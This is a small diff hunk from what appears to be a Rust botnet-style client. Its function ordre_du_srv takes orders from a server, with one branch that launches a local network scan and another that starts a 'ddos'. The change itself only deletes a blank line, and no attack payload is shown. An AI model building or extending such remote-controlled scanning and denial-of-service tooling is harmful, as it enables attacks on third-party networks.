@@ -14,7 +14,6 @@ pub(crate) fn ordre_du_srv(mut ordre: String) {
         println!("Lancement du Scan réseau");
         let t = thread::spawn(move|| { scan::scan(scan::find_net()); });
 
-
     }else if ordre == "ddos" {
 
         println!("lancement ddos");
